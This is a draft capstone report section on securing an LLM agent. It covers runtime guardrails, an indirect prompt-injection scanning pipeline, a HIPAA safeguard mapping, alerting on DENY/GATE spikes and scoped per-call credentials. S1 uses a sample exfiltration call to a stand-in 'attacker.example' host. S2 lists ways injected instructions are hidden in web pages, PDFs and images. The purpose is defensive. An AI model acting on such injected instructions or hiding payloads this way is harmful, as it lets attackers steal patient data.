# Project Report — Security & Compliance Sections (Draft v1)

> **Draft v1, 2026-08-30 (S5 added 2026-09-02).** Five supplementary sections feeding the Assignment 1
> rubric: §S1 and §S2 feed *Review of Existing Technologies* (inside Problem Identification, 5 pts) and
> the *Maintenance, Security, Compliance* chapter (5 pts); §S3, §S4 and §S5 feed *Maintenance,
> Security, Compliance* directly. These are draft material, not final rubric headings — do not rename
> the graded headings in `phase1-chapters.md`; fold this prose in under them.
>
> **Framing that governs all three sections.** The containment monitor judges tool calls by *what
> they are*, never by what the agent says about them (spec.md §3, §10). The content-layer tools
> surveyed in §S1–§S2 are therefore positioned as **complementary, upstream** defences — they reduce
> how often a malicious instruction reaches the model — and are explicitly **never** part of a
> `Decision`. The monitor remains the deterministic, fail-closed backstop that holds even when every
> upstream probabilistic control fails. Sources are listed at the end of each section.

---

## S1 — Runtime Guardrails for the LLM Agent (Review of Existing Technologies)

### The gap guardrails fill, and the gap they leave

A *guardrail* is a runtime control that inspects and constrains the text flowing into and out of a
language model. Three production, open-source systems dominate the ecosystem and are complementary
rather than competing:

- **Llama Guard 3** (Meta) — a Llama-3.1-8B model fine-tuned as a *safety classifier*. Given a
  prompt or a response it returns `safe`, or `unsafe` plus the violated MLCommons hazard categories
  (S1–S14); it also offers a *tool-call / code-interpreter* classification mode and covers eight
  languages. It is the strongest *semantic* content-safety classifier of the three.
- **NeMo Guardrails** (NVIDIA) — a *programmable* dialogue-rail framework. Input, output, dialog,
  retrieval and execution rails are declared in a `config.yml` plus Colang flows, and can call an
  external classifier such as Llama Guard as an action.
- **LLM Guard** (Protect AI) — a deterministic *scanner pipeline*: fifteen input scanners and twenty
  output scanners (PromptInjection, Toxicity, Secrets, Anonymize, Sensitive, BanTopics, …), each
  returning a sanitised string, a validity flag and a per-scanner risk score.

These systems answer the question *"is this text unsafe?"* — jailbreaks, toxic content, leaked
secrets or PII in a response, off-topic drift. That is a real and necessary control, and it maps to
MITRE ATLAS **AML.T0054 (LLM Jailbreak)** and **AML.T0057 (LLM Data Leakage)**. But it is a
fundamentally different question from the one this project answers. A guardrail classifies *text*;
the monitor adjudicates *actions*. `export_records(destination="attacker.example")` is not toxic,
contains no profanity, leaks no secret in its wording, and reads as a perfectly ordinary sentence —
so a content classifier passes it. Its harm lives entirely in what it *does* and in the *sequence*
it completes, which is exactly the layer the containment monitor governs and the content layer
cannot see. This holds even for Llama Guard 3's tool-call classification mode: it judges the
*rendered text* of a proposed call against the hazard taxonomy, still probabilistically and
still one call at a time. It has no notion of the monitor's per-call policy verdict, of the
kill-chain sequence state a call advances, or of the irreversibility class that routes a call to a
human GATE — so it can flag a call that *reads* dangerous, but cannot deterministically deny the
benign-reading `export_records` that completes a chain. Classifying the text of an action is not
adjudicating the action.

### Why the monitor deliberately excludes a model-based guardrail from its verdict

The project's boundaries (spec.md §10) forbid letting agent output — or any LLM judgement — influence
a `Decision`, and forbid an LLM judge in any success metric. This is not an oversight; it is the
thesis. A guardrail classifier is probabilistic, model-based and itself a target for adversarial
evasion (the very jailbreak corpora used to validate it demonstrate the bypasses). Admitting such a
signal into the verdict would reintroduce the non-determinism and the "judge the narration, not the
act" failure mode the monitor exists to remove. The verdict function stays pure and fail-closed
(`evaluate`, spec.md §9); guardrails sit *outside* it.

### Recommended defence-in-depth posture for a production deployment

For the Provider's real environment (as opposed to the mock capstone build), the two layers compose
cleanly:

1. **Upstream content layer (guardrails).** An LLM Guard input pipeline
   (`PromptInjection`, `Secrets`, `Toxicity`, `TokenLimit`) on any text entering the agent, and an
   output pipeline (`Sensitive` with PHI entity types, `NoRefusal`) on any text leaving it. Optional
   Llama Guard 3 as a semantic second opinion, wired through NeMo as a `content_safety` rail. This
   reduces the *rate* of malicious instructions reaching the model.
2. **Downstream action layer (this monitor).** Every resulting tool call is still adjudicated
   ALLOW / DENY / GATE, per-call and per-sequence, regardless of whether the content layer let the
   text through. This bounds the *blast radius* when the content layer inevitably misses something.

The honest division of labour: guardrails lower probability, the monitor lowers impact. Neither
subsumes the other, and only the monitor's contribution is deterministic and audit-reconstructable.

**What this does not do.** The guardrail layer is a *recommendation* for productionisation, not part
of the delivered system; the mock environment has no real network or model egress to protect
(spec.md §4). Guardrail decisions, if adopted, must be logged to the same audit stream but kept
strictly separate from the monitor's `rule_id`-bearing `Decision` records, so the "verdict is
independent of agent text" claim remains literally true.

**Sources.** Llama Guard 3 (Meta, Hugging Face `meta-llama/Llama-Guard-3-8B`); NeMo Guardrails
(NVIDIA); LLM Guard (Protect AI); OWASP **LLM01:2025 Prompt Injection**; MLCommons hazard taxonomy;
MITRE ATLAS **AML.T0054**, **AML.T0057**.

---

## S2 — Detecting Indirect Prompt Injection (Review of Existing Technologies / Threat Model)

### Why this is the Provider's primary vector

The threat model (D9) fixes the adversary at the **indirect** channel: the operator is trusted, and
malicious content arrives inside the data the agent legitimately consumes — a support ticket body, a
log line, an email it triages, a client document it summarises. This is MITRE ATLAS
**AML.T0051.001 (LLM Prompt Injection: Indirect)** and OWASP **LLM01:2025**. It is the hard case
precisely because, as Zverev et al. establish and the problem statement already cites, a language
model cannot reliably separate instructions from data: every token in the context window is treated
as equally authoritative, so an attacker who controls any consumed artefact can graft in
instructions that the agent then executes as if the operator had issued them.

Naive input filtering misses this because the payload rides a *trusted-looking* channel and is often
*human-invisible*: HTML comments and `display:none` / zero-width text on a web page; white-on-white
or off-page text in a PDF; alt-text and EXIF metadata, or text rendered into pixels, in an image;
Unicode tag and zero-width smuggling; Base64 / ROT13 obfuscation.

### An ingestion-scanning pipeline (upstream detection)

A pre-ingestion gate detects the payload *before* it reaches the model, in five stages drawn from
current practice:

1. **Extract hidden text** — parse HTML for comments, CSS-hidden elements and alt-text
   (BeautifulSoup); pull PDF text (pypdf); OCR text painted into images (Tesseract).
2. **Normalise / de-obfuscate** — strip zero-width and Unicode-tag characters, NFKC-flatten, and
   decode Base64 / ROT13 so the detector sees the real payload.
3. **Scan (deterministic)** — LLM Guard's `PromptInjection` scanner returns a per-artefact risk
   score.
4. **Scan (model, second opinion)** — Meta **Prompt Guard 2** or the open ProtectAI
   `deberta-v3-base-prompt-injection-v2` classifier.
5. **Decide and log** — combine the signals into block / sanitise / allow and emit a structured
   telemetry event (source, SHA-256, per-detector verdicts, `atlas: AML.T0051.001`) for the SIEM.

### How the monitor relates to it — detection upstream, containment downstream

This pipeline is **detection**; the monitor is **containment**. They are layered, not redundant:

- The scanning pipeline tries to stop the injected instruction from ever reaching the model. It is
  probabilistic and, like any classifier, will miss novel or heavily obfuscated payloads.
- When it misses — and the threat model assumes it eventually will — the injected instruction only
  matters if it produces a *harmful tool call or chain*. That call still meets the fail-closed
  per-call policy and the kill-chain sequence engine, and its irreversible steps still route to the
  human GATE. The agent believing a forged instruction changes nothing about how its resulting
  actions are judged.

This is the cleanest articulation of the project's value: the monitor converts an *unsolved* problem
(reliably detecting indirect injection in arbitrary content) into a *bounded* one (constraining the
actions any injection can achieve). The scanning pipeline shrinks the input; the monitor caps the
output.

**What this does not do.** The ingestion pipeline is a productionisation recommendation; the mock
build ingests only controlled scenario inputs and takes no live external content (spec.md §4). It
does not, and cannot, guarantee zero missed payloads — which is *why* the downstream monitor is the
load-bearing control and is presented as such. Cross-reference: residual risk R2 (novel,
un-modelled orderings) and R1 (low-and-slow chains) bound what the containment layer itself catches.

**Sources.** MITRE ATLAS **AML.T0051.001**, **AML.T0051**, **AML.T0057**, **AML.T0053**; OWASP
**LLM01:2025**; Meta **Prompt Guard 2** (`meta-llama/Llama-Prompt-Guard-2-86M`); ProtectAI
`deberta-v3-base-prompt-injection-v2`; LLM Guard (Protect AI); Zverev et al. (instruction/data
separation, cited in Problem Identification).

---

## S3 — HIPAA Security Rule Safeguard Mapping (Maintenance, Security, Compliance)

### The Provider's role and why the Security Rule applies

The Provider handles electronic protected health information (ePHI) on behalf of roughly thirty
covered practices; it is therefore a **business associate** under HIPAA, bound by a Business
Associate Agreement (BAA) with each practice (45 CFR §164.314 / §164.308(b)) and directly liable for
the Security Rule's safeguards (45 CFR §§164.302–318). An LLM agent that drives remote-management
tooling across those practices is a new system that creates, receives, maintains or transmits ePHI —
so it must be brought inside the existing safeguard programme, and its containment monitor is one of
the technical controls that does so. The single most-cited gap in OCR enforcement is a missing or
stale **Security Risk Analysis** (§164.308(a)(1)(ii)(A)); the analysis below feeds that artefact
rather than replacing it.

### Where the monitor maps onto the Technical Safeguards (§164.312)

The monitor's contribution is concentrated in the Technical Safeguards, and it is honest to say it
touches some specifications squarely and others only partially:

| HIPAA specification | Monitor contribution | Status |
|---|---|---|
| **Audit controls** §164.312(b) | Append-only JSONL audit log; every tool call yields a `Decision` with a traceable `rule_id`; run fully reconstructable by replay | **Directly supports** (strengthen with hash-chaining — see GitHub #56) |
| **Access control** §164.312(a)(1) — unique user ID, emergency access | Session-bound `Principal`, monitor-issued opaque token the agent cannot forge (D12.2); GATE provides a human emergency-approval path | **Directly supports** |
| **Access control** — automatic logoff, encryption/decryption | Out of the monitor's scope; belongs to the console session layer and at-rest/in-transit encryption | **Gap — other controls** |
| **Integrity** §164.312(c)(1) — authenticate ePHI | Argument hashing gives tamper-*evidence* of a call's parameters; append-only write discipline | **Partial** (append-only-by-convention today; #56 adds cryptographic tamper-evidence) |
| **Person/entity authentication** §164.312(d) | Operator authenticates to the console (login page, session auth) before resolving a GATE | **Directly supports (console)** |
| **Transmission security** §164.312(e)(1) | Loopback transport terminates plaintext HTTP on `127.0.0.1` under a single-host trust assumption (D11); production would require TLS | **Partial — documented limitation** |

The monitor also reinforces two **Administrative Safeguard** items (§164.308): the *information-system
activity review* (the audit log and console decision feed are the review substrate) and *security
incident procedures* (a DENY or GATE burst is the detection signal — see §S4 for the alerting design,
GitHub #58). It does **not** itself satisfy contingency planning, workforce security, or training,
which remain the Provider's broader programme.

### Required vs addressable, and the 2025 NPRM

Under the current rule each specification is **Required** or **Addressable**; addressable does not
mean optional — it means a documented, risk-based decision, implementing an equivalent alternative if
the specification as written is not reasonable. The monitor's design choices (e.g. plaintext loopback
under a single-host assumption) should be recorded in exactly that form in the risk analysis.

Looking ahead, the HHS OCR **2025 NPRM (proposed, not yet final)** would remove the
required/addressable distinction and mandate, among other things, MFA, encryption of ePHI at rest and
in transit, an asset inventory and network map, vulnerability scans every six months, annual
penetration testing, and annual risk-analysis updates. The monitor is well-positioned for the audit,
integrity and access-control direction of travel; the plaintext-loopback and at-rest-encryption gaps
are precisely what a final rule would force, so they belong on the remediation plan now rather than as
a later scramble. These are **proposals** — the current rule governs until a final rule is effective.

**What this does not do.** The monitor is one technical control, not a HIPAA compliance programme. It
stores no ePHI itself (the mock tools operate over in-process state, spec.md §4), performs no
encryption, and does not produce the required Security Risk Analysis, BAAs, or six-year documentation
retention (§164.316) — those are organisational obligations this section feeds, not ones the software
discharges. Encryption to NIST standards remains the breach-notification *safe harbour*
(§§164.400–414) and is the highest-value gap to close for productionisation.

**Sources.** 45 CFR Part 164 Subpart C (Security Rule) and Subpart D (Breach Notification); NIST
**SP 800-66 Rev 2**; NIST **SP 800-30**; HHS **Security Risk Assessment (SRA) Tool**; HHS OCR
**2025 NPRM** (Jan 6, 2025, proposed). Cross-references: GitHub issues #56 (audit tamper-evidence),
#58 (runtime alerting), #59 (scoped credentials); residual-risks.md (loopback transmission caveat).

---

## S4 — Runtime Alerting on DENY/GATE Spikes (Maintenance, Security, Compliance)

### The operational gap this closes

The monitor already *records* the right signal: every tool call yields a `Decision`, and every
`Decision` is written to the append-only JSONL audit log with its verdict, session, principal,
`rule_id` and a SHA-256 of the arguments (`src/audit/`). What the delivered system does **not** do is
watch that stream *live*. A spike of **DENY** or **GATE** verdicts from a single session is the
classic prompt-injection tell — an injected or misconfigured agent probing the tool boundary trips
the fail-closed per-call policy and the human-approval GATE over and over in a short burst. Offline
evaluation (`src/eval/`) computes false-approval / false-block / utility *after* a run; it is the wrong
instrument for a control that has to fire *during* one. This section is the deliberate, documented
boundary called out against the `securing-agentic-ai-tool-invocation` control review (step 7, "audit,
alert, and review — alert on deny / require-approval spikes, a signal of injection") and maps to MITRE
ATLAS **AML.T0053 (LLM Plugin Compromise)** and **AML.T0051 / .001 (LLM Prompt Injection, incl.
Indirect)**.

### The audit log is already the SIEM feed

No new instrumentation is required to productionise this — the audit JSONL is a SIEM-ready feed by
construction:

- **One structured event per line.** Each record is a single self-describing JSON object
  (`type`, `session_id`, `principal`, `verdict`, `rule_id`, `gate_class`, `arg_sha256`, `timestamp`),
  which a log shipper can parse without a custom grok pattern.
- **PII-free by design.** Arguments are hashed, never stored in plaintext (criterion #8), so the feed
  can leave the trust boundary for a SIEM without carrying ePHI — the HIPAA-safe property the whole
  log discipline was built for (§S3, Audit controls §164.312(b)).
- **Append-only.** The writer only ever appends (`src/audit/writer.py`), which is exactly the
  discipline a tail-based forwarder expects and what makes the stream tamper-*evident* (hardened
  further by hash-chaining, GitHub #56).

The forwarding path is therefore conventional: a file-tailing shipper (**Fluent Bit / Filebeat**, or
`rsyslog imfile`) follows the append-only log and ships each new line to the Provider's SIEM
(**Microsoft Sentinel**, **Splunk**, or **Elastic**), where the detection rule below lives.

### The detection rule: a per-session DENY/GATE rate threshold

The alert is a deterministic rate/threshold rule, stated here as vendor-neutral pseudo-logic and
directly translatable to a Sentinel analytics rule, a Splunk correlation search, or a Sigma rule over
the shipped fields:

```
GROUP audit events BY session_id OVER a sliding window W (e.g. 60s)
  deny_count := COUNT(verdict = "deny")
  gate_count := COUNT(verdict = "gate")
WHEN deny_count >= DENY_THRESHOLD OR gate_count >= GATE_THRESHOLD
  RAISE alert(session_id, principal, deny_count, gate_count, first_ts, last_ts)
      severity = high, atlas = AML.T0053, playbook = "phishing/injection triage"
```

Grouping by `session_id` (and, for a session-rotation-aware variant, by `principal`) localises the
burst to one actor, matching the monitor's own `SubjectKey` model (`src/monitor/types.py`). DENY and
GATE are alerted on **separately** — a wall of denials means the agent is repeatedly attempting
forbidden actions, while a wall of GATEs means it is repeatedly driving irreversible / high-blast-radius
calls at the human approver — and either burst alone is enough to raise the session for review
(deny-by-default spirit). Thresholds are tuned per deployment against the benign baseline the eval
suite already establishes, so a legitimately busy remediation session does not page the on-call.

### What is shipped now: the offline analyzer

The optional stretch is delivered as `src/audit/spike.py` — a deterministic, offline analyzer that
applies exactly the rule above to a completed audit log, reusing `src/audit/replay.py` as the single
fail-closed reader (a corrupt line raises `AuditFormatError`, never a silent skip):

```
python -m src.audit.spike results/final.jsonl --deny-threshold 5 --gate-threshold 5
```

It tallies DENY / GATE per session, prints the flagged sessions worst-first with their burst span, and
**exits non-zero when any session is flagged** so it can double as an alert check in a scheduled job or
CI step. It is a *detection aid only*: it reads the log after the fact and never feeds a `Decision`
(spec.md §10 — the verdict stays independent of anything derived downstream). It is the reproducible,
test-backed proof of the detection logic; the live SIEM rule is the same logic run continuously against
the forwarded stream.

**What this does not do.** Live streaming alerting is a *maintenance / future-work* item, not shipped
code: the mock capstone build is a short-lived evaluation harness with no long-running deployment, no
SIEM, and no on-call to page (spec.md §4), so wiring a real-time consumer would be scaffolding with
nothing to protect. A rate threshold also inherently catches *fast* bursts, not the deliberately
**low-and-slow** chain that stays under the per-window count — residual risk **R1**. That is precisely
why the alert is positioned as an operational *detection* layer on top of, and never a replacement for,
the load-bearing deterministic controls: the per-call policy and the kill-chain **sequence engine**
bound what any injection achieves whether or not a burst ever trips the alert. Tuning to keep the
false-alarm rate acceptable, and the SOC runbook that triages a firing, are Provider operational
responsibilities this section feeds.

**Sources.** `securing-agentic-ai-tool-invocation` (control review, step 7; Control Reference — "Audit
logging → detection + forensics"); MITRE ATLAS **AML.T0053**, **AML.T0051**, **AML.T0051.001**; OWASP
**Agentic AI Top 10** (Tool Misuse, Excessive Agency); **Sigma** detection-rule format. Cross-references:
`src/audit/spike.py` and `tests/audit/test_spike.py` (shipped analyzer); GitHub #56 (audit
tamper-evidence / hash-chaining strengthens the feed); residual-risks.md **R1** (low-and-slow evasion).

---

## S5 — Scoped, Short-Lived Per-Call Credentials (Maintenance, Security, Compliance)

### Identity is bound; authority is not scoped

The monitor already closes the *identity* half of least privilege. Every session is opened under a
resolved `Principal` and handed back only an opaque token; the agent holds the token, never the
principal, and cannot choose or forge who it acts as (`src/monitor/service.py:73-79`, D12.2 / D14):

```python
def open_session(self, principal: str = "client-primary") -> SessionHandle:
    session_id = self._sessions.open_session()
    token = uuid.uuid4().hex
    self._bindings[token] = (session_id, Principal(principal))
    return SessionHandle(token=token)
```

That principal is threaded into the tool at dispatch (`src/tools/base.py:25`,
`tool.execute(call.args, str(principal))` in `_execute`). But it arrives as an *identity label*, not
as a *credential*: the tool then acts on in-process state with whatever ambient authority it already
holds. There is no per-call, principal-scoped credential minted for the call and destroyed after it.
So the monitor answers *"who is acting, and is this action permitted?"* deterministically, yet in a
real deployment the permitted action would still execute under whatever standing rights the tool
process carries. Complete mediation (Anderson 1972) governs *whether* the call runs; it does not, on
its own, bound *how much authority* the call wields once it does.

### The production control: mint authority per call, scoped to the principal, short-lived

For the Provider's real RMM / PHI boundary — where the mock's in-process state is replaced by an
actual RMM platform, endpoint APIs, and record stores holding ePHI — each mediated call should
execute under a **freshly issued, narrowly scoped, short-lived credential tied to the session
principal**, not under a shared service account. Concretely, at the ALLOW/approved-GATE moment the
monitor (or a broker it calls) would:

1. **Assume a role scoped to the principal** — an STS-style `AssumeRole` (AWS), workload-identity
   token exchange (GCP), or managed-identity federation (Azure) keyed to the session `Principal`,
   so the credential can only touch the tenant/practice that principal is entitled to.
2. **Attach a session policy of minimal actions** — the credential grants exactly the operations the
   permitted call needs (e.g. `read_endpoint`, not `export_records`), matching the per-call verdict
   the monitor just issued, so a permitted-but-abused call cannot pivot beyond its intended scope.
3. **Set a short TTL and bind it to the call** — minutes, not hours; ideally one credential per
   mediated call, expiring before the next, so a leaked credential is worthless almost immediately
   and never becomes a standing key.

This makes the monitor's `Decision` and the credential's scope the *same* boundary expressed twice —
once as an allow/deny verdict, once as cryptographically enforced authority — rather than a
permissive verdict riding on god-mode rights. It also composes with the rest of the safeguard story:
the credential's assume-role and expiry events are themselves audit records (§S3, Audit controls
§164.312(b)), and scoping to the session principal reinforces Access control §164.312(a)(1).

### Why this is least privilege, and why the mock omits it

This is the direct application of **least privilege and fail-safe defaults (Saltzer & Schroeder
1975)** — already the framing the spec adopts for the whole monitor (spec.md §3, "a reference monitor
… applying least privilege and fail-safe defaults to agent actions"). Least privilege is not
satisfied by *deciding* correctly; it also requires that each execution *carry* only the authority
that decision implies. Scoped, short-lived per-call credentials are how the principle reaches the
authority layer the monitor's verdict cannot itself constrain.

The mock deliberately omits this, and the omission is correct rather than a defect: the mock tools
operate over in-process Python state (spec.md §4) and hold **no real authority to scope** — there is
no RMM tenant, cloud IAM, or record store for a credential to be minted against, so an
assume-role/session-policy/TTL apparatus would be scaffolding around nothing. The identity binding
(D12.2) is the part that is meaningful without real backing authority, and it is implemented; the
credential scoping is the part that only becomes meaningful once real authority exists, and it is
therefore documented here as a deployment control rather than built.

**What this does not do.** No code change is warranted for the mock system — the enforcement design
is sound and the gap is entirely in the production-deployment story. This section does not implement
credential brokering; it specifies the control a reviewer would otherwise ask for ("what stops a
permitted call from using god-mode RMM rights?"). It also does not replace the load-bearing controls:
per-call scoping bounds the authority of a *single* permitted call, while the kill-chain **sequence
engine** still bounds what a series of individually-permitted calls can complete. The two are
complementary — credentials cap one call's blast radius, the sequence engine caps the chain's.

**Sources.** Saltzer & Schroeder (1975), *least privilege* and *fail-safe defaults* (cited in
spec.md §3); Anderson (1972), reference-monitor / complete mediation; `securing-agentic-ai-tool-invocation`
(control review, control 3 — "scoped, short-lived per-call credentials — no shared god account");
NIST **SP 800-207 Zero Trust Architecture** (per-request, least-privilege access); AWS STS
`AssumeRole` with session policies (illustrative mechanism). Cross-references:
`src/monitor/service.py:73-79` (D12.2 identity binding) and `src/tools/base.py:25` (principal passed,
not scoped); GitHub #59; §S3 Access control §164.312(a)(1) and Audit controls §164.312(b).
